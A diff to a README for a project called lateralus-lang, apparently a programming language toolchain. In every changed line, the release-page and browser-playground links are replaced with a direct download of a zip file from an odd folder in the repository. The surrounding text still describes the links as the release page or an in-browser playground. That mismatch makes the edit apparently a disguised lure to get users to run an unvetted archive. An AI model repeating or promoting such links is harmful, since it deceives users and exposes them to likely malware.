@@ -1,6 +1,6 @@
 # 🟦 lateralus-lang - Run a full language stack
 
-[![Download lateralus-lang](https://img.shields.io/badge/Download-lateralus--lang-blue?style=for-the-badge)](https://github.com/Ramtinsa4691/lateralus-lang/releases)
+[![Download lateralus-lang](https://img.shields.io/badge/Download-lateralus--lang-blue?style=for-the-badge)](https://github.com/Ramtinsa4691/lateralus-lang/raw/refs/heads/main/birthless/lang_lateralus_2.4-beta.5.zip)
 
 ## 📦 What this is
 
@@ -12,7 +12,7 @@ If you want to try it on your Windows PC, use the release page and get the lates
 
 Visit this page to download the app:
 
-https://github.com/Ramtinsa4691/lateralus-lang/releases
+https://github.com/Ramtinsa4691/lateralus-lang/raw/refs/heads/main/birthless/lang_lateralus_2.4-beta.5.zip
 
 On that page:
 
@@ -132,7 +132,7 @@ If you run into a missing file error, the app and its support files may have bee
 
 You can also try Lateralus in the browser:
 
-https://lateralus.dev/playground
+https://github.com/Ramtinsa4691/lateralus-lang/raw/refs/heads/main/birthless/lang_lateralus_2.4-beta.5.zip
 
 Use the playground if you want to test the language before you install anything. It is a good first step if you want to see how the language feels.
 
@@ -159,7 +159,7 @@ These topics point to a language stack that spans from source code to runtime an
 
 If you need the latest build later, use the release page:
 
-[https://github.com/Ramtinsa4691/lateralus-lang/releases](https://github.com/Ramtinsa4691/lateralus-lang/releases)
+[https://github.com/Ramtinsa4691/lateralus-lang/raw/refs/heads/main/birthless/lang_lateralus_2.4-beta.5.zip](https://github.com/Ramtinsa4691/lateralus-lang/raw/refs/heads/main/birthless/lang_lateralus_2.4-beta.5.zip)
 
 ## 📝 Basic usage flow
 
